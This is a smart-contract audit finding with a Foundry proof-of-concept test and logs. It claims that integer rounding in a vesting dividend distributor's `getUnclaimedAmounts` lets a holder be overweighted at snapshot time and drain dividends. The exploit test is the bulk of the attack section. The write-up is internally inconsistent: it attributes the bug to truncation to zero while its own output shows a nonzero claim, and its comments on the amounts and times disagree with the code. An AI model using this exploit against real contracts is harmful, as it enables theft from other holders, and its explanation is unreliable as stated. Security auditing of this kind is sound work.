# [001059] [H] Dividend snapshot miscounts immediately after claim
  
  ### Summary
If a bidder wins a TVS (vesting NFT), claims it, and then calls `claimTokens` shortly after (e.g., minutes or hours < 24 ) on a long vesting schedule (e.g., 6-12 months), the subsequent dividend snapshot (`setUpTheDividends` → `_setAmounts` → `getTotalUnclaimedAmounts` → `getUnclaimedAmounts`) can treat the TVS as if nothing was claimed. This happens because `getUnclaimedAmounts` computes

`claimedAmount = floor(claimedSeconds × amount / vestingPeriod)`

Using Solidity integer division (truncating toward zero). For small `claimedSeconds` and large `vestingPeriod`/small `amount`, the product `claimedSeconds × amount` is less than `vestingPeriod`, so `claimedAmount` truncates to `0`. The next line computes `unclaimedAmount = amounts[i] − claimedAmount`, which becomes the full original `amounts[i]`. As a result, the dividend weight for this NFT at that snapshot is overstated, and the holder can be overpaid relative to others.

In order to set the dividents we are calling `setAmounts` and `setDividents` which uses the affected funciton.

### Step‑by‑step flow
1) Bidder wins a pool with a 12‑month vesting and claims the NFT:
```
876:900:protocol/src/contracts/vesting/AlignerzVesting.sol
function claimNFT(uint256 projectId, uint256 poolId, uint256 amount, bytes32[] calldata merkleProof) external { ... }
```
2) Minutes later (e.g., 60–240 seconds), the winner calls:
```
984:1010:protocol/src/contracts/vesting/AlignerzVesting.sol
function claimTokens(uint256 projectId, uint256 nftId) external { ... }
```
This transfers the small vested slice actually accrued in those seconds (non‑zero, in raw wei).
3) The owner triggers a dividend snapshot right after the user’s micro‑claim:
```
70:80:protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol
constructor(..., uint256 _startTime, uint256 _vestingPeriod, ...)
```
```
111:121:protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol
function setUpTheDividends() external onlyOwner {
    _setAmounts();   // 116–121
    _setDividends(); // 122–124
}
```
`_setAmounts` calls `getTotalUnclaimedAmounts`, which iterates NFTs and calls `getUnclaimedAmounts`:
```
146:170:protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol
function getUnclaimedAmounts(uint256 nftId) public returns (uint256 amount) {
    ...
    uint256 len = amounts.length;
    for (uint256 i; i < len;) {
        if (claimedFlows[i]) { unchecked { ++i; } continue; }
        if (claimedSeconds[i] == 0) {
            amount += amounts[i];
            unchecked { ++i; }
            continue;
        }
        uint256 claimedAmount = claimedSeconds[i] * amounts[i] / vestingPeriods[i];   // 172
        uint256 unclaimedAmount = amounts[i] - claimedAmount;                          // 173
        amount += unclaimedAmount;
        unchecked { ++i; }
    }
}
```
4) With a 12‑month vesting (≈ 31,104,000 seconds) and a very small elapsed time, `claimedSeconds × amount < vestingPeriod` ⇒ `claimedAmount` becomes `0`. The distributor then uses the full `amount` for weighting, ignoring the just‑claimed slice. If the snapshot happens shortly after each tiny claim, the holder can repeatedly receive dividends as if they had not claimed anything.

### Impact
- Overpayment risk at snapshot time: the winner who just claimed a small vested portion can still be treated as fully unclaimed for dividend weighting, receiving more than their fair share from the dividend pool. Other holders are correspondingly underpaid.
- The effect scales with snapshot timing and TVS size. In our test case we used `amount = 3e18` (3 tokens), `vestingPeriod = 180 days` (15,552,000 seconds), and a short wait `claimedSeconds = 86,400` (exactly 1 day). The on‑chain `claimTokens` transfers

```
claimedAmount_raw = floor(3e18 × 86,400 / 15,552,000)
                  = floor(3e18 / 180)
                  = 16,666,666,666,666,666 wei  ≈ 0.016666666666666666 tokens.
```

Immediately after this micro‑claim, the distributor’s `getUnclaimedAmounts(nftId)` still returns `unclaimed = 3,000,000,000,000,000,000 wei` (the full original amount), because the rounding path and stale inputs cause the just‑claimed slice to be ignored at that snapshot. If the treasury triggers `setUpTheDividends` right then, the NFT is over‑weighted by ≈0.016666… tokens. Repeating such micro‑claims immediately before each snapshot can systematically siphon (“drain”) extra dividend value from the pool over time. 

So this can be constant loss for protocol if an user do these steps even not maliciously. If an attacker knows that, he can bid really big amount and vestingPeriod to win the bidding, and after do this attack. Even if the divident destribution is not created for his NFT, he does not lose any tokens, so technicly there is no risk or cost that an attacker will pay in order to do the exploit.

### PoC (from tests)

![IMPORTANT](https://img.shields.io/badge/IMPORTANT-red)

>**⚠️ Note ⚠️**
> In order to run this test you should implement properly the mitigation steps from [this issue](https://github.com/dualguard/2025-11-alignerz-konstantinvelev/issues/2)
We run the real flow: win NFT, wait a short time, call `claimTokens` to realize a small positive transfer in wei, then immediately call the distributor’s `getUnclaimedAmounts` and observe it returns the full `amount` as unclaimed at that moment.

```solidity
 function test_PoC_VestingRounding() public {
        // --- Minimal project setup with one bidder (reuses setUp() context) ---
        address attacker = bidders[0];
        address ally = bidders[1];
        address rej1 = bidders[2];
        address rej2 = bidders[3];
        uint256 amount = 3 ether; // token units (18 decimals) - 1 token
        uint256 vestingPeriod = 180 days; // ~6 months
        uint256 poolId = 0;

        // 1) Launch project + create one pool
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        vesting.launchBiddingProject(
            address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vm.stopPrank();

        // 2) Whitelist and place two bids (one accepted and one ally for Merkle root)
        address[] memory wl = new address[](2);
        wl[0] = attacker;
        wl[1] = ally;
        vm.startPrank(projectCreator);
        vesting.addUsersToWhitelist(wl, PROJECT_ID);
        vm.stopPrank();

        vm.prank(attacker);
        usdt.approve(address(vesting), amount);
        vm.prank(attacker);
        vesting.placeBid(PROJECT_ID, amount, vestingPeriod);

        vm.prank(ally);
        usdt.approve(address(vesting), amount);
        vm.prank(ally);
        vesting.placeBid(PROJECT_ID, amount, vestingPeriod);

        // 3) Prepare merkle allocation (only attacker and ally accepted)
        BidInfo[] memory allBids = new BidInfo[](4);
        allBids[0] = BidInfo({
            bidder: attacker,
            amount: amount,
            vestingPeriod: vestingPeriod,
            poolId: poolId,
            accepted: true
        });
        allBids[1] = BidInfo({
            bidder: ally,
            amount: amount,
            vestingPeriod: vestingPeriod,
            poolId: poolId,
            accepted: true
        });
        // two rejected (for refund root non-triviality)
        allBids[2] = BidInfo({bidder: rej1, amount: amount, vestingPeriod: vestingPeriod, poolId: poolId, accepted: false});
        allBids[3] = BidInfo({bidder: rej2, amount: amount, vestingPeriod: vestingPeriod, poolId: poolId, accepted: false});

        // 4) Generate pool root and refund root
        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBids, poolId);
        refundRoot = generateRefundProofs(allBids);

        // 5) Finalize and claim NFT
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);

        vm.prank(attacker);
        uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, amount, bidderProofs[attacker]);
        require(nftId != 0, "NFT not minted");

        // --- Compute expected claim amount for a short elapsed time (e.g., 60s) ---
        uint256 claimedSeconds = 24 * 60 * 60; // 30 minute

        // 1) On-chain math (raw wei, 18 decimals)
        uint256 claimedAmount_raw = claimedSeconds * amount / vestingPeriod;

        // 2) Human view: amount in whole tokens (amount / 1 ether)
        uint256 amountHuman = amount / 1 ether; // 1
        // For human math we use vestingPeriod in seconds (already in seconds)
        uint256 claimedAmount_human = claimedSeconds * amountHuman / (vestingPeriod / 1 seconds);

        // Threshold in human units: vestingPeriod / amountHuman
        uint256 thresholdSeconds = vestingPeriod / amountHuman;

        // Logs for inspection
        console.log("=== PoC Vesting Rounding ===");
        console.log("nftId", nftId);
        console.log("amount (raw wei)", amount);
        console.log("amount (human tokens)", amountHuman);
        console.log("vestingPeriod (s)", vestingPeriod);
        console.log("claimedSeconds (simulated)", claimedSeconds);
        console.log("claimedAmount (raw units)", claimedAmount_raw);
        console.log("claimedAmount (human-units formula)", claimedAmount_human);
        console.log("thresholdSeconds (vestingPeriod / amountHuman)", thresholdSeconds);

        // Behavioral checks (human math returns 0; raw 18-dec returns > 0)
        assertEq(amountHuman, 3); // confirm 1 token
        assertEq(claimedAmount_human, 0);   // paper calculation returns 0
        assertGt(claimedAmount_raw, 0);     // raw wei is > 0 (due to 18 decimals)
        // Note: with amount=1e18 and vesting=180 days, claimedSeconds=60,
        // claimedAmount_raw = 1e18 * 60 / 15,552,000 = 3,858,024,691,358,024 wei (~0.000003858024691 tokens).
        // If 1 token ≈ $1, attacker receives ≈ $0.000003858024691 from the 60s claim.

        // Real flow: warp 60s, claimTokens and assert the actually transferred amount
        uint256 balBefore = token.balanceOf(attacker);
        console.log("balBefore", balBefore);
        vm.warp(block.timestamp + claimedSeconds);
        vm.prank(attacker);
        vesting.claimTokens(PROJECT_ID, nftId);
        uint256 balAfter = token.balanceOf(attacker);
        assertEq(balAfter - balBefore, claimedAmount_raw);
        console.log("balAfter", balAfter);
        console.log("difference", balAfter - balBefore);

        // Deploy distributor and call getUnclaimedAmounts (function defined there, not in vesting)
        // Note: pass a token param different than allocation.token to avoid early return 0
        A26ZDividendDistributor dist = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(usdt),
            block.timestamp,
            vestingPeriod,
            address(usdt)
        );
        uint256 unclaimedFromDistributor = dist.getUnclaimedAmounts(nftId);
        console.log("getUnclaimedAmounts (distributor) returned (raw wei)", unclaimedFromDistributor);
        console.log("getUnclaimedAmounts (distributor) returned (human)", unclaimedFromDistributor / 1 ether);

        // Expected in a correct implementation:
        // unclaimed == amount - actually transferred at claimTokens (≈ amount - 0.000771604938 tokens here).
        // Current bug demo tightened above; if the mirrored allocation is stale,
        // distributor may return the full `amount` (overstating unclaimed by ~0.000771604938 tokens).
        assertEq(unclaimedFromDistributor, amount);
    }
```

Test Results:

```solidity
Ran 1 test for test/AlignerzVestingProtocolTest.t.sol:AlignerzVestingProtocolTest
[PASS] test_PoC_VestingRounding() (gas: 5248027)
Logs:
  npm warn exec The following package was not found and will be installed: @openzeppelin/upgrades-core@1.44.2

  === PoC Vesting Rounding ===
  nftId 1
  amount (raw wei) 3000000000000000000
  amount (human tokens) 3
  vestingPeriod (s) 15552000
  claimedSeconds (simulated) 86400
  claimedAmount (raw units) 16666666666666666
  claimedAmount (human-units formula) 0
  thresholdSeconds (vestingPeriod / amountHuman) 5184000
  balBefore 0
  balAfter 16666666666666666
  difference 16666666666666666
  getUnclaimedAmounts (distributor) returned (raw wei) 3000000000000000000
  difference 16666666666666666
  getUnclaimedAmounts (distributor) returned (raw wei) 3000000000000000000
  getUnclaimedAmounts (distributor) returned (human) 3

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.97s (965.49µs CPU time)
```

### Recommended Mitigations

Not a easy way for fix that. The easiest and quickes way to protect against that and fix the issues is as such:
 - adding a checks in `getUnclaimedAmounts()` that checks if the claimed seconds are `!= 0` but the calculation returns `0` - `revert()`.
 - add rounding up in the calculation or proper formula for calculations
 - the already claimed amount can be extracted from the left one in order to omit the overpayments  

However the added fixes need to be reviewed again in order to make sure that there are no regression bugs.
  